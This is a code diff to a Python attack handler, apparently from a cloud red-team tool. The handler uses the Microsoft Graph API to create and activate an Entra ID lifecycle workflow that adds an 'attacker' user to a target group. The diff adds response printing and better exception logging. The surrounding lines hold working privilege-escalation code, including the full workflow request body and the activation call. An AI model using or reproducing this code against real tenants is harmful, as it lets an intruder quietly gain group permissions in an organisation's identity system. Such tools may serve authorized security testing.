@@ -3,6 +3,8 @@ from attacks.handlers.base_handler import AttackHandler, Request, Response
 from utils import logger
 import requests
 import random, string
+import json as js
+
 
 logger = logger.createLogger('attacks.handlers.lifecycle_groups_handler')
 
@@ -26,13 +28,14 @@ class Lifecycle_GroupHandler(AttackHandler):
                 message_obj = {"category":"mover","displayName":"Real-time PermissionPanic to group " + displayname,"description":"Execute real-time tasks for employee job changes","tasks":[{"arguments":[{"name":"groupID","value":conf["groupId"]}],"description":"Add user to selected groups","displayName":"Add user to groups " + displayname,"isEnabled":"true","continueOnError":"false","taskDefinitionId":"22085229-5809-45e8-97fd-270d28d66910","category":"joiner,leaver,mover"}],"executionConditions":{"@odata.type":"#microsoft.graph.identityGovernance.onDemandExecutionOnly"},"isEnabled":"true","isSchedulingEnabled":"false"}
                 result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                 json = result.json()
-                id = json["id"]
-
+                print(js.dumps(json))
+                
                 if result.status_code == 201:
+                    id = json["id"]
                     create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows/" + id + "/activate"
                     message_obj = {"subjects": [{"id": conf["attacker"]}]}
                     result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
-                    
+                
                     if result.status_code == 204:
                         message += "added user %s to group %s  \n" % (conf["attacker"], conf["groupId"])
                         status = True
@@ -40,8 +43,9 @@ class Lifecycle_GroupHandler(AttackHandler):
                     
                 if message == "":
                     message = error
-            except:
-                logger.error("Unexpected exception in lifecycle_groups_handler function")
+
+            except Exception as e:
+                logger.error(f"Unexpected exception in lifecycle_groups_handler function: {e}")
 
             
             responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
